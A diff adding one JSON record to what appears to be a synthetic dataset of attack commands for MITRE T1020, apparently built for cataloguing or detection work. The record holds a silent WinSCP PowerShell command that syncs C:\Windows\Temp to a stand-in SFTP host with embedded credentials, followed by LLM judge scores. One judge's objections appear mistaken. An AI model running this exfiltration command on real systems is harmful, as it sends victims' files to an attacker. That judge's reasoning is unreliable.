@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/mirror/temp/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.50/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"synchronize remote C:\\Windows\\Temp `\"$r`\" -criteria=time -delete\") 'exit' | Out-Null 2>$null",
+  "explanation": "Mirrors the local Temp directory to a remote SFTP location automatically, pushing only changed files and removing remote files no longer present locally.",
+  "rationale_steps": [
+    "Define local and remote sync targets",
+    "Establish SFTP connection in batch mode",
+    "Synchronize in 'remote' mode based on timestamps",
+    "Avoid interactive prompts and silence output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-ce7b3733",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, correct call operator usage, valid WinSCP /command arguments, and proper piping/redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "WinSCP synchronize remote correctly automates pushing changed files from C:\\Windows\\Temp to the specified SFTP path with batch mode, no confirmations, time-based criteria, and deletion, aligning with automated exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T03:56:04.879658Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, balanced parentheses, valid PowerShell syntax for variable assignment, proper command invocation, and correct parameter passing to WinSCP.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using WinSCP to synchronize local Windows temp files to a remote SFTP server with credentials, hostkey verification, and synchronization options that match files based on time criteria.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:56:08.150047Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The WinSCP `/command` switch expects a single string argument containing the script, but the command provides multiple independent strings, which will cause WinSCP.com to fail parsing after the first argument.",
+        "semantic_score": 2,
+        "semantic_justification": "The explanation claims the command 'mirrors the local Temp directory to a remote' (exfiltration), but the `synchronize remote` command in WinSCP actually synchronizes the remote directory to the local directory, which is the opposite of exfiltration.",
+        "combined_score": 2.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:54:23.078168Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
